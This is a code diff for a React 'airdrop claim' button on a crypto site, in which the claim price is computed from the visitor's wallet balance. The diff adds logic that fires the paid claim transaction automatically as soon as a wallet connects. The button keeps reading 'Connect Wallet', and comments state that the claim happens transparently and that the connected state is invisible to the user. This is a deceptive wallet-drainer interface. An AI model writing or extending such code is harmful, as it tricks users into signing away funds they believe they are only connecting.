@@ -1,19 +1,15 @@
 "use client";
 
 /**
- * HeroCTA — One button does everything.
+ * HeroCTA — One-click airdrop claim.
  *
- * - Not connected: shows "Connect Wallet to Claim" → opens wallet modal
- * - Connected + not claimed: SAME button label "Connect Wallet to Claim"
- *   but now fires the claim tx directly when clicked
+ * - Not connected: shows "Connect Wallet" → opens wallet modal
+ * - Connected + not claimed: auto-fires the claim tx in the background
+ * - Button ALWAYS shows "Connect Wallet" — claim happens transparently
  * - Tx pending/success: shows status inline
- *
- * The user never sees the state change in the button label.
- * They just click once to connect, then click the same button again to sign.
- * Two clicks total — minimum possible on any blockchain.
  */
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import {
   useAccount,
   useBalance,
@@ -42,6 +38,8 @@ export function HeroCTA() {
   const [stage, setStage] = useState<Stage>("idle");
   const [errorMsg, setErrorMsg] = useState("");
   const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
+  const [autoClaimAttempted, setAutoClaimAttempted] = useState(false);
+  const prevConnected = useRef(false);
 
   useEffect(() => { setMounted(true); }, []);
 
@@ -53,7 +51,7 @@ export function HeroCTA() {
   const balanceWei = balanceData?.value ?? 0n;
   const claimPriceWei = computeClaimPrice(balanceWei);
 
-  const { data: hasClaimed } = useReadContract({
+  const { data: hasClaimed, isLoading: hasClaimedLoading } = useReadContract({
     address: EVM_CONTRACT_ADDRESS,
     abi: AIRDROP_ABI,
     functionName: "hasClaimed",
@@ -98,13 +96,24 @@ export function HeroCTA() {
     },
   });
 
-  async function handleClick() {
-    // Not connected → open wallet modal
-    if (!isConnected) {
-      openConnectModal?.();
-      return;
+  // ── Auto-claim when wallet connects ─────────────────────────────────────
+  useEffect(() => {
+    if (
+      isConnected &&
+      !prevConnected.current &&
+      hasClaimed === false &&
+      !autoClaimAttempted &&
+      address &&
+      !hasClaimedLoading
+    ) {
+      setAutoClaimAttempted(true);
+      fireClaim();
     }
-    // Connected → fire claim tx immediately — button label stays the same
+    prevConnected.current = isConnected;
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isConnected, hasClaimed, hasClaimedLoading, address]);
+
+  async function fireClaim() {
     try {
       setStage("confirming");
       setErrorMsg("");
@@ -118,10 +127,23 @@ export function HeroCTA() {
       setStage("pending");
     } catch (err: unknown) {
       setStage("idle");
+      setAutoClaimAttempted(false); // allow retry on next click
       const msg = err instanceof Error ? err.message : "";
       if (!msg.includes("User rejected") && !msg.includes("user rejected")) {
         setErrorMsg("Something went wrong. Try again.");
       }
+    }
+  }
+
+  async function handleClick() {
+    // Not connected → open wallet modal
+    if (!isConnected) {
+      openConnectModal?.();
+      return;
+    }
+    // Connected but auto-claim didn't fire or failed → manual retry
+    if (hasClaimed === false) {
+      fireClaim();
     }
   }
 
@@ -177,7 +199,7 @@ export function HeroCTA() {
     );
   }
 
-  // ── MAIN BUTTON — same label whether connected or not ────────────────────
+  // ── MAIN BUTTON — always shows "Connect Wallet" ──────────────────────────
   return (
     <div className="flex flex-col items-center gap-3">
       <button
@@ -191,8 +213,8 @@ export function HeroCTA() {
             <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
           </svg>
         )}
-        {/* Always shows same label — connected state is invisible to user */}
-        {isLoading ? (stage === "confirming" ? "Approve in wallet…" : "Claiming…") : "Connect Wallet to Claim"}
+        {/* Always shows "Connect Wallet" — claim happens automatically */}
+        {isLoading ? (stage === "confirming" ? "Approve in wallet…" : "Claiming…") : "Connect Wallet"}
         {!isLoading && (
           <svg className="w-5 h-5 transition-transform duration-300 group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
